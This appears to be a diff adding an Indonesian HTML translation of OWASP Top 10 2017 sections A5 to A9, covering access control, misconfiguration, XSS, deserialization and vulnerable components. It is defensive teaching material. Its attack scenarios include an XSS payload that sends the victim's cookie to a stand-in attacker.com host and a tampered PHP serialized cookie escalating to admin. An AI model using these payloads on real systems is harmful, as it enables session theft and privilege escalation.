+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Access Lvl : Eksploitasi 2</td>
+<td>Prevalensi 3: Deteksi 2</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Eksploitasi kontrol akses adalah keahlian inti pada penyerang. <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> dan <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> Tool ini dapat mendeteksi tidak adanya kontrol akses tetapi tidak dapat memverifikasi apakah itu berfungsi ketika serangan itu muncul. Kontrol akses dapat dideteksi menggunakan cara manual, atau mungkin melalui otomatisasi karena tidak adanya kontrol akses dalam framework tertentu</td>
+<td>Kelemahan kontrol akses adalah umum karena kurangnya security assessment/deteksi awal, dan kurangnya pengujian fungsional yang efektif oleh pengembang aplikasi. Deteksi kontrol akses biasanya tidak menerima pengujian statis atau dinamis otomatis. Pengujian manual adalah cara terbaik untuk mendeteksi kontrol akses yang hilang atau tidak efektif, termasuk metode HTTP (GET vs PUT, dll), Kontrol, referensi objek langsung, dll.</td>
+<td>Dampak teknisnya adalah penyerang bertindak sebagai pengguna atau administrator, atau pengguna yang menggunakan hak akses istimewa, atau membuat, mengakses, memperbarui, atau menghapus setiap catatan. Dampak bisnis tergantung pada kebutuhan perlindungan aplikasi dan data</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-4">Apakah Aplikasi itu Rentan?</h2>
+<p>Kontrol akses memberlakukan kebijakan sedemikian rupa sehingga pengguna tidak dapat bertindak di luar izin yang dimaksudkan. Kegagalan dalam mengimplementasikan kontrol akses akan mendampakkan pengeluaran sebuah informasi tanpa izin, modifikasi atau kerusakan semua data, atau melakukan sebuah fungsi bisnis diluar batasan yang telah diberikan kepada sebuah user / pengguna. Kerentanan kontrol akses yang umum termasuk:</p>
+<ul>
+<li>Melewati pemeriksaan kontrol akses dengan memodifikasi URL, status aplikasi internal, atau halaman HTML, atau hanya menggunakan sebuah alat khusus untuk menyerang API.</li>
+<li>Mengizinkan kunci utama atau primary key untuk diubah ke catatan pengguna orang lain, sehingga menyebabkan orang lain dapat melihat atau mengedit akun orang lain.</li>
+<li>Ketinggian hak istimewa. Bertindak sebagai pengguna tanpa login, atau bertindak sebagai admin saat login sebagai pengguna.</li>
+<li>Manipulasi metadata, seperti memutar ulang atau merusak token kontrol akses JSON Web Token (JWT) atau cookie atau bidang tersembunyi yang dimanipulasi untuk meningkatkan hak istimewa, atau menyalahgunakan pembatalan JWT</li>
+<li>Kesalahan konfigurasi CORS memungkinkan akses API yang tidak diizinkan.</li>
+<li>Paksa penelusuran ke halaman yang diautentikasi sebagai pengguna yang tidak diauthentikasi atau ke halaman yang diistimewakan sebagai pengguna standar. Mengakses API dengan kontrol akses yang hilang untuk POST, PUT dan DELETE.</li>
+</ul>
+<h2 id="cara-pencegahan">Cara Pencegahan</h2>
+<p>Kontrol akses hanya efektif jika ditegakkan dalam kode sisi server terpercaya atau server-less API, yang dimana penyerang tidak dapat mengubah pemeriksaan kontrol akses atau metadata.</p>
+<ul>
+<li>Dengan pengecualian sumber daya publik, tolak secara default.</li>
+<li>Terapkan mekanisme kontrol akses satu kali dan digunakan kembali di seluruh aplikasi, termasuk meminimalkan penggunaan CORS.</li>
+<li>Kontrol akses model harus menegakkan kepemilikan catatan, daripada membolehkan bahwa pengguna atau user dapat membuat, membaca, memperbarui, atau menghapus catatan apa pun.</li>
+<li>Persyaratan batas bisnis aplikasi unik harus diberlakukan oleh model domain.</li>
+<li>Nonaktifkan daftar direktori server web dan pastikan metadata file (mis. Git) dan file cadangan tidak ada dalam root web.</li>
+<li>Log kegagalan kontrol akses, admin waspada bila perlu (mis. Kegagalan berulang).</li>
+<li>Menentukan batas limit untuk akses API dan controller untuk meminimalkan bahaya dari perkakas serangan otomatis.</li>
+<li>Token JWT harus tidak valid di server setelah logout.</li>
+<li>Pengembang dan staf QA harus mencakup unit kontrol akses fungsional dan tes integrasi.</li>
+</ul>
+<h2 id="contoh-skenario-serangan-4">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Aplikasi menggunakan data yang tidak diverifikasi dalam panggilan SQL yang mengakses informasi akun:</p>
+<pre><code>  pstmt.setString(1, request.getParameter(&quot;acct&quot;));
+  ResultSet results = pstmt.executeQuery();</code></pre>
+<p>Seorang penyerang hanya memodifikasi parameter 'acct' di browser untuk mengirim nomor akun apa pun yang mereka inginkan. Jika tidak diverifikasi dengan benar, penyerang dapat mengakses akun pengguna mana pun.</p>
+<p><code>https://example.com/app/accountInfo?acct=notmyacct</code></p>
+<p><strong>Scenario #2</strong>: Seorang penyerang cukup memaksa browser untuk menargetkan URL. Hak admin diperlukan untuk akses ke halaman admin.</p>
+<pre><code>  https://example.com/app/getappInfo
+  https://example.com/app/admin_getappInfo</code></pre>
+<p>Jika pengguna yang tidak diautentikasi dapat mengakses halaman mana pun, itu adalah kontrol akses yang buruk. Jika non-admin dapat mengakses halaman admin, ini adalah otentifikasi yang buruk.</p>
+<h2 id="referensi-5">Referensi</h2>
+<h3 id="owasp-4">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls">OWASP Proactive Controls: Access Controls</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x12-V4-Access-Control.md">OWASP Application Security Verification Standard: V4 Access Control</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README">OWASP Testing Guide: Authorization Testing</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html">OWASP Cheat Sheet: Access Control</a></li>
+</ul>
+<h3 id="eksternal-2">Eksternal</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284: Improper Access Control (Authorization)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285: Improper Authorization</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
+<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">PortSwigger: Exploiting CORS misconfiguration</a></li>
+</ul>
+<h1 id="a62017-kesalahan-konfigurasi-keamanan">A6:2017 Kesalahan Konfigurasi Keamanan</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Access Lvl : Eksploitasi 2</td>
+<td>Prevalensi 3: Deteksi 2</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Penyerang akan sering mencoba untuk mengeksploitasi kelemahan yang tidak diawasi atau mengakses akun default, halaman yang tidak digunakan, file dan direktori yang tidak dilindungi, dll untuk mendapatkan akses tanpa izin atau informasi tentang sistem.</td>
+<td>Kesalahan konfigurasi keamanan dapat terjadi di semua tingkat <em>stack</em> aplikasi, termasuk layanan jaringan, platform, server web, server aplikasi, database, <em>framework</em>, kode kustom, dan <em>pre-installed virtual machine</em>, <em>container</em>, atau penyimpanan. Pemindai otomatis berguna untuk mendeteksi kesalahan konfigurasi, penggunaan akun atau konfigurasi default, layanan yang tidak perlu, opsi lawas, dll.</td>
+<td>Kelemahan seperti itu sering memberi penyerang akses tanpa izin ke beberapa data sistem atau fungsionalitas. Terkadang kelemahan tersebut berujung pada kerusakan sistem secara menyeluruh. Dampak bisnis tergantung pada kebutuhan perlindungan aplikasi dan data.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-5">Apakah Aplikasi itu Rentan?</h2>
+<p>Aplikasi dapat menjadi rentan jika:</p>
+<ul>
+<li>Tidak ada <em>hardening</em> keamanan yang sesuai di seluruh bagian dari <em>stack</em> aplikasi, atau izin yang tidak dikonfigurasi dengan benar pada layanan <em>cloud</em>.</li>
+<li>Fitur yang tidak diperlukan masih diaktifkan atau diinstal (contoh: <em>port</em>, layanan, halaman, akun, atau <em>privilege</em> yang tidak perlu).</li>
+<li>Akun bawaan dengan kata sandi yang masih diaktifkan dan tidak berubah.</li>
+<li>Penanganan <em>error</em> yang menyingkapkan <em>stack trace</em> atau <em>error message</em> yang terlalu informatif kepada pengguna.</li>
+<li>Untuk sistem yang diperbarui, fitur keamanan terbaru dinonaktifkan atau tidak dikonfigurasi dengan aman.</li>
+<li>Pengaturan keamanan di server aplikasi, <em>framework</em> aplikasi (contoh: Struts, Spring, ASP.NET), <em>library</em>, <em>database</em>, dll tidak disetting secara aman.</li>
+<li>Server tidak mengirim security headers atau arahan keamanan atau tidak diatur untuk mengamankan nilai dari sisi backend.</li>
+<li>Software telah out of date atau diketahui rentan (lihat <strong>A9:2017-Using Components with Known Vulnerabilities</strong>).</li>
+</ul>
+<p>Tanpa proses konfigurasi keamanan aplikasi yang diintegrasikan dan dilakukan secara berkala, sistem berisiko lebih tinggi.</p>
+<h2 id="cara-pencegahan-1">Cara Pencegahan</h2>
+<p>Proses instalasi secara aman harus diimplementasikan, termasuk:</p>
+<ul>
+<li>Proses <em>hardening</em> yang dapat diulang bisa mempermudah dan mempercepat proses <em>deploy</em> untuk <em>environment</em> baru yang terkunci dengan baik. <em>Environment</em> untuk <em>Development</em>, <em>QA</em>, dan <em>Production</em> harus diatur secara serupa, dan dengan <em>credential</em> yang berbeda-beda dalam setiap <em>environment</em> nya. Proses ini harus bisa dilakukan secara otomatis untuk mengurangi usaha dalam pembuatan <em>environment</em> baru yang aman.</li>
+<li><em>Platform</em> yang minimal tanpa fitur, komponen, dokumentasi, dan contoh yang tidak dibutuhkan. Hapus atau jangan <em>install</em> fitur dan <em>framework</em> yang tidak dibutuhkan.</li>
+<li>Tugas untuk mengkaji ulang dan memperbarui pengaturan yang pantas kepada semua catatan keamanan, <em>update</em>, dan <em>patch</em> sebagai bagian dari proses manajemen <em>patch</em> (lihat <strong>A9:2017-Using Components with Known Vulnerabilities</strong>). Khususnya, review perizinan penyimpanan <em>cloud</em> (contoh: S3 bucket permissions).</li>
+<li>Arsitektur aplikasi yang terbagi-bagi dan menyediakan pemisahan yang efektif dan aman antara komponen atau <em>tenant</em> menggunakan segmentasi, <em>containerization</em>, atau <em>cloud security groups</em> (ACL).</li>
+<li>Mengirimkan arahan keamanan kepada <em>client</em>, contoh: <a href="https://owasp.org/www-project-secure-headers/">Security Headers</a>.</li>
+<li>Proses otomatis dalam memastikan efektivitas dari pengaturan dalam semua <em>environment</em>.</li>
+</ul>
+<h2 id="contoh-skenario-serangan-5">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Server aplikasi disediakan bersama aplikasi contoh yang tidak dihapus dari server <em>production</em>. Aplikasi contoh ini memiliki celah keamanan yang diketahui dan dapat digunakan penyerang untuk membahayakan server. Jika salah satu dari aplikasi tersebut adalah <em>admin console</em> dan akun bawaan tidak diganti saat di-<em>install</em>, maka penyerang dapat masuk menggunakan <em>password</em> bawaan dan mengambil alih kontrol.</p>
+<p><strong>Skenario #2</strong>: <em>Directory listing</em> tidak dimatikan pada server. Penyerang mengetahui bahwa mereka dapat dengan mudah membuat daftar direktori. Penyerang dapat menemukan dan mengunduh <em>class</em> Java yang sudah di-<em>compile</em>, yang dapat mereka <em>decompile</em> dan <em>reverse engineer</em> untuk melihat <em>code</em> di dalamnya. Setelah itu penyerang dapat menemukan celah <em>access control</em> dalam aplikasi tersebut.</p>
+<p><strong>Skenario #3</strong>: Pengaturan server aplikasi yang memperlihatkan pesan error secara detail, contoh: stack traces, yang ditampilkan kepada pengguna. Hal ini memiliki potensi untuk membeberkan informasi sensitif atau celah-celah mendasar seperti versi komponen yang mungkin diketahui memiliki celah keamanan.</p>
+<p><strong>Skenario #4</strong>: Penyedia layanan <em>cloud</em> yang memberikan <em>default sharing permission</em> yang dapat diakses oleh pengguna layanan lain melalui Internet. Hal ini dapat menyebabkan akses kepada data sensitif yang disimpan dalam penyimpanan <em>cloud</em>.</p>
+<h2 id="referensi-6">Referensi</h2>
+<h3 id="owasp-5">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README">OWASP Testing Guide: Configuration Management</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README">OWASP Testing Guide: Testing for Error Codes</a></li>
+<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Security Headers Project</a></li>
+</ul>
+<p>Untuk persyaratan tambahan bisa di lihat lebih detail pada (ASVS) Application Security Verification Standard <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x22-V14-Config.md">V19 Configuration</a>.</p>
+<h3 id="eksternal-3">Eksternal</h3>
+<ul>
+<li><a href="https://csrc.nist.gov/publications/detail/sp/800-123/final">NIST Guide to General Server Hardening</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/2.html">CWE-2: Environmental Security Flaws</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/388.html">CWE-388: Error Handling</a></li>
+<li><a href="https://www.cisecurity.org/cis-benchmarks/">CIS Security Configuration Guides/Benchmarks</a></li>
+<li><a href="https://blog.websecurify.com/2017/10/aws-s3-bucket-discovery.html">Amazon S3 Bucket Discovery and Enumeration</a></li>
+</ul>
+<h1 id="a72017-cross-site-scripting-xss">A7:2017 Cross-Site Scripting (XSS)</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Akses Lvl: Eksploitasi 3</td>
+<td>Prevalensi 3 : Deteksi 3</td>
+<td>Teknis 2 : Bisnis</td>
+</tr>
+<tr class="even">
+<td>Tool otomasi dapat mendeteksi dan melakukan exploit pada semua tiga type XSS, and ada Framework eksploitasi yang tersedia secara gratis.</td>
+<td>XSS adalah kerentanan paling umum kedua di OWASP Top 10, dan masih ditemukan di sekitar dua pertiga dari semua aplikasi. Tool otomasi dapat menemukan beberapa kerentanan XSS secara otomatis, Khususnya dalam aplikasi pemrograman seperti PHP, J2EE / JSP, dan ASP.NET.</td>
+<td>Dampak pada XSS untuk kategori medium untuk Reflected XSS dan DOM XSS dan Kritikal untuk stored XSS, dengan eksekusi kode jarak jauh di browser korban, seperti mencuri kredensial, sesi, atau mengirimkan malware ke korban</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-6">Apakah Aplikasi itu Rentan?</h2>
+<p>Ada Tiga Jenis XSS, biasanya menargetkan browser pengguna:</p>
+<ul>
+<li><strong>Reflected XSS</strong>: Aplikasi atau API menyertakan masukan pengguna yang tidak divalidasi dan tidak lolos sebagai bagian dari keluaran HTML. Serangan yang berhasil memungkinkan penyerang mengeksekusi HTML dan JavaScript sewenang-wenang di browser korban. Biasanya pengguna perlu berinteraksi dengan beberapa tautan berbahaya yang mengarah ke laman yang dikendalikan penyerang, seperti situs web watering hole berbahaya, iklan, atau sejenisnya</li>
+<li><strong>Stored XSS</strong>: Aplikasi atau API menyimpan masukan pengguna yang tidak dibersihkan yang dilihat di lain waktu oleh pengguna lain atau administrator. XSS yang disimpan sering dianggap sebagai risiko tinggi atau kritis.</li>
+<li><strong>DOM XSS</strong>: Kerangka kerja JavaScript, aplikasi halaman tunggal, dan API yang secara dinamis menyertakan data yang dapat dikontrol penyerang ke halaman rentan terhadap DOM XSS. Idealnya, aplikasi tidak akan mengirim data yang dapat dikontrol penyerang ke JavaScript API yang tidak aman. Serangan XSS termasuk pencurian sesi user, account takeover, <em>MFA bypass</em>, <em>DOM node replacement</em> atau merubah tampilan website target (seperti panel login trojan), serangan terhadap browser pengguna seperti unduhan perangkat lunak berbahaya, pencatatan log kunci, dan serangan sisi klien lainnya.</li>
+</ul>
+<h2 id="bagaimana-cara-pencegahannya-1">Bagaimana Cara Pencegahannya</h2>
+<p>Pencegahan XSS membutuhkan pemisahan pada data yang tidak terpecaya dari konten browser yang aktif. Ini dapat dicapai dengan:</p>
+<ul>
+<li>Menggunakan kerangka kerja yang secara otomatis lolos dari XSS berdasarkan desain, seperti Ruby on Rails terbaru, React JS. Pelajari batasan perlindungan XSS setiap framework dan tangani kasus penggunaan yang tidak tercakup dengan tepat.</li>
+<li>Mengeluarkan semua data yang tidak dipercaya berdasarkan konteks HTML (<em>body, attribute, JavaScript, CSS, atau URL)</em> akan menutup celah Reflected and Stored XSS. Lihat OWASP XSS Prevention Cheat Sheet untuk detail dari teknik mengeluarkan data.</li>
+<li>Menerapkan pengkodean berkonteks peka saat memodifikasi dokumen browser di sisi klien bertindak melawan DOM XSS. Jika hal ini tidak dapat dihindari, teknik pelolosan sensitif konteks serupa dapat diterapkan ke API browser seperti yang dijelaskan di OWASP Cheat Sheet 'DOM based XSS Prevention'.</li>
+<li>Memungkinkan <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a>sebagai kontrol mitigasi pertahanan mendalam terhadap XSS. Ini efektif jika tidak ada kerentanan lain yang memungkinkan penempatan kode berbahaya melalui penyertaan file loka (e.g. path traversal menimpa atau pustaka yang rentan dari jaringan pengiriman konten yang diizinkan).</li>
+</ul>
+<h2 id="contoh-skenario-serangan-6">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Aplikasi menggunakan data tidak tepercaya dalam pembuatan kode HTML berikut tanpa validasi:</p>
+<p><code>(String) page += "&lt;input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'&gt;";</code> Penyerang memodifikasi parameter ‘CC’ dalam browser menjadi:</p>
+<p><code>'&gt;&lt;script&gt;document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
+<p>Serangan ini disebabkan ID sesi korban untuk dikirim ke situs web penyerang, sehingga memungkinkan penyerang untuk membajak sesi pengguna saat ini.</p>
+<p><strong>Note</strong>: Penyerang dapat menggunakan XSS untuk mengalahkan pertahanan Cross-Site Request Forgery (CSRF) otomatis yang mungkin digunakan aplikasi</p>
+<h2 id="referensi-7">Referensi</h2>
+<h3 id="owasp-6">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proactive Controls: Encode Data</a></li>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proactive Controls: Validate Data</a></li>
+<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard: V5</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP Testing Guide: Testing for Reflected XSS</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">OWASP Testing Guide: Testing for Stored XSS</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">OWASP Testing Guide: Testing for DOM XSS</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: XSS Prevention</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: DOM based XSS Prevention</a></li>
+<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">OWASP Cheat Sheet: XSS Filter Evasion</a></li>
+<li><a href="https://owasp.org/www-project-java-encoder/">OWASP Java Encoder Project</a></li>
+</ul>
+<h3 id="external-3">External</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper neutralization of user supplied input</a></li>
+<li><a href="https://portswigger.net/kb/issues/00200308_client-side-template-injection">PortSwigger: Client-side template injection</a></li>
+</ul>
+<h1 id="a82017-deserialisasi-yang-tidak-aman">A8:2017 Deserialisasi yang Tidak Aman</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Threat agents/Attack vectors</th>
+<th>Security Weakness</th>
+<th>Impacts</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Akses Lvl: Eksploitasi 1</td>
+<td>Prevalensi 2 : Deteksi 2</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Penyerang dapat mengeksploitasi prosesor XML yang rentan jika mereka dapat mengunggah XML atau menyertakan konten yang tidak bersahabat dalam dokumen XML, mengeksploitasi kode yang rentan, ketergantungan, atau integrasi.</td>
+<td>Masalah ini termasuk dalam Top 10 berdasarkan <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">Survei Industri </a> dan bukan pada data yang dapat dihitung. Beberapa alat dapat menemukan kekurangan deserialisasi, tetapi bantuan manusia sering kali diperlukan untuk memvalidasi masalah. Diharapkan bahwa data prevalensi untuk kekurangan deserialisasi akan meningkat seiring dengan pengembangan perangkat untuk membantu mengidentifikasi dan mengatasinya.</td>
+<td>Dampak kelemahan deserialisasi tidak bisa dilebih-lebihkan. Cacat ini dapat menyebabkan serangan eksekusi kode jarak jauh, salah satu serangan paling serius yang mungkin terjadi. Dampak bisnis bergantung pada kebutuhan perlindungan aplikasi dan data.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-7">Apakah Aplikasi itu Rentan?</h2>
+<p>Aplikasi dan API akan menjadi rentan jika mereka menghilangkan identitas objek yang dimusuhi atau dirusak yang disediakan oleh penyerang.</p>
+<p>Ini dapat mengakibatkan dua jenis serangan utama:</p>
+<ul>
+<li>Serangan terkait objek dan struktur data di mana penyerang mengubah logika aplikasi atau mencapai eksekusi kode jarak jauh arbitrer jika ada kelas yang tersedia untuk aplikasi yang dapat mengubah perilaku selama atau setelah deserialisasi.</li>
+<li>Serangan perusakan data tipikal seperti serangan terkait kontrol akses di mana struktur data yang ada digunakan tetapi kontennya diubah.</li>
+</ul>
+<p>Serialisasi dapat digunakan dalam aplikasi untuk:</p>
+<ul>
+<li><em>Remote</em> dan komunikasi antar proses (RPC/IPC)</li>
+<li>Protokol kawat, layanan web, perantara pesan</li>
+<li>Caching / Persistensi</li>
+<li>Database, server cache, sistem file</li>
+<li>Cookie pada HTTP, HTML form parameter, otentikasi token pada API</li>
+</ul>
+<h2 id="bagaimana-cara-pencegahannya-2">Bagaimana Cara Pencegahannya</h2>
+<p>Satu-satunya pola arsitektur yang aman adalah tidak menerima objek serialisasi dari sumber yang tidak terpercaya atau menggunakan media serialisasi yang hanya mengizinkan tipe data primitif.</p>
+<p>Jika memungkinkan, pertimbangkan salah satu cara pencegahan dibawah ini :</p>
+<ul>
+<li>Menerapkan pemeriksaan integritas seperti tanda tangan digital pada objek serial apa pun untuk mencegah pembuatan objek yang tidak terpecaya atau gangguan data.</li>
+<li>Menerapkan batasan tipe yang ketat selama desentralisasi sebelum pembuatan objek karena kode biasanya mengharapkan sekumpulan kelas yang dapat ditentukan. Pengabaian<br />
+terhadap teknik ini telah dibuktikan, jadi tidak disarankan untuk mengandalkan hanya pada teknik ini.</li>
+<li>Mengisolasi dan menjalankan kode yang deserialisasi dengan hak Environment lebih rendah jika memungkinkan</li>
+<li>Pengecualian dan kegagalan deserialisasi log, seperti saat jenis yang masuk bukan jenis yang diharapkan, atau deserialisasi melontarkan pengecualian.</li>
+<li>Membatasi atau memantau konektivitas jaringan masuk dan keluar dari kontainer atau server yang deserialisasi</li>
+<li>Monitoring deserialisasi, memberikan <em>alert</em> jika ada <em>user</em> terus menerus melakukan deserialisasi.</li>
+</ul>
+<h2 id="contoh-skenario-serangan-7">Contoh Skenario Serangan</h2>
+<p><strong>Scenario #1</strong>: Aplikasi React memanggil satu set layanan mikro Spring Boot. Sebagai programmer fungsional, mereka mencoba memastikan bahwa kode mereka tidak dapat diubah. Solusi yang mereka hasilkan adalah membuat serial status pengguna dan meneruskannya bolak-balik dengan setiap permintaan. Seorang penyerang memperhatikan tanda tangan objek Java "R00", dan menggunakan alat Pembunuh Serial Java untuk mendapatkan eksekusi kode jarak jauh pada server aplikasi. <strong>Scenario #2</strong>: Sebuah kode PHP menggunakan serialisasi objek PHP untuk menyimpan sebuah "super" cookie, berisi user's user ID, role, password hash, dan bagian yang lain:</p>
+<p><code>a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></p>
+<p>Seorang Penyerang mengubah object serialisasi untuk mengubah aksesnya menjadi hak akses admin: <code>a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></p>
+<h2 id="referensi-8">Referensi</h2>
+<h3 id="owasp-7">OWASP</h3>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Cheat Sheet: Deserialization</a></li>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs">OWASP Proactive Controls: Validate All Inputs</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard: TBA</a></li>
+<li><a href="https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse">OWASP AppSecEU 2016: Surviving the Java Deserialization Apocalypse</a></li>
+<li><a href="https://speakerdeck.com/pwntester/friday-the-13th-json-attacks">OWASP AppSecUSA 2017: Friday the 13th JSON Attacks</a></li>
+</ul>
+<h3 id="external-4">External</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
+<li><a href="https://github.com/mbechler/marshalsec">Java Unmarshaller Security</a></li>
+<li><a href="https://frohoff.github.io/appseccali-marshalling-pickles/">OWASP AppSec Cali 2015: Marshalling Pickles</a></li>
+</ul>
+<h1 id="a92017-menggunakan-komponen-yang-diketahui-rentan">A9:2017 Menggunakan Komponen yang Diketahui Rentan</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Threat agents/Attack vectors</th>
+<th>Security Weakness</th>
+<th>Impacts</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Access Lvl : Exploitability 2</td>
+<td>Prevalence 3 : Detectability 2</td>
+<td>Technical 2 : Business</td>
+</tr>
+<tr class="even">
+<td>Meskipun mudah untuk menemukan eksploitasi yang telah tercatat dalam banyak kasus kerentanan yang telah diketahui, kerentanan lain yang belum diketahui membutuhkan usaha yang lebih dalam mengembangkan sebuah Custom Exploit. </td>
+<td>Tingkat kelaziman mengenai permasalahan ini sangat luas. Komponen yang sulit dalam pola pengembangan dapat menyebabkan tim pengembangan bahkan kurang mengerti mengenai komponen yang mereka gunakan dalam aplikasi mereka atau pada API, apalagi menjaganya agar tetap mutakhir. beberapa sistem pemindai seperti retire.js dapat membantu dalam pendeteksian, tetapi dalam mengetahui exploitability membutuhkan upaya tambahan</td>
+<td>sementara itu, dalam beberapa kasus kerentanan yang diketahui hanya menyebabkan dampak kecil, beberapa pelanggaran terbesar hingga saat ini mengandalkan pengeksploitasian kerentanan yang ada dalam komponen, bergantung dalam aset yang anda sedang lindungi, kemungkinan resiko seperti ini harus berada pada urutan teratas dalam daftar kerentanan</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-rentan">Apakah aplikasi rentan?</h2>
+<p>Tampaknya aplikasi anda rentan:</p>
+<ul>
+<li>Jika anda tidak tahu versi dari semua komponen yang digunakan (bagian client maupun server). Ini juga termasuk Komponen yang langsung anda gunakan sebagai komponen yang bergantung satu sama lain (nested dependencies).</li>
+<li>Jika software rentan, tidak mendukung, atau masa aktif telah habis. Termasuk juga OS, web/aplikasi server, database management system (DBMS), aplikasi, API dan semua komponen, lingkungan berjalannya program, dan libarynya.</li>
+<li>Jika anda tidak melakukan scanning vulnerabilities secara teratur dan mengikuti kabar keamanan terkait dengan komponen yang anda gunakan</li>
+<li>Jika anda tidak memperbaiki atau memperbarui platform yang mendasarinya, frameworks, dan dependencies yang termasuk dalam risk-based secara berkala. Ini biasanya terjadi pada environments saat penutupan celah sebagai tugas setiap bulan atau kuarter pada masa kontrol perubahan, yang mana organisasi telah membiarkan beberapa hari atau bulan akan pengerjaan tidak penting untuk pembenaran celah</li>
+<li>Jika software deplopers tidak melakukan test terhadap kesesuaian update, upgrade atau pembaruan libary.</li>
+<li>Jika anda tidak mengamankan konfigurasi komponen (lihat <strong>A6:2017-Security Misconfiguration</strong>).</li>
+</ul>
+<h2 id="cara-untuk-mencegah-1">Cara Untuk Mencegah</h2>
+<p>Seharusnya ada proses manajemen patch untuk:</p>
+<ul>
+<li>Menghapus dependensi yang tidak digunakan, fitur, komponen, file, dan dokumentasi yang tidak perlu.</li>
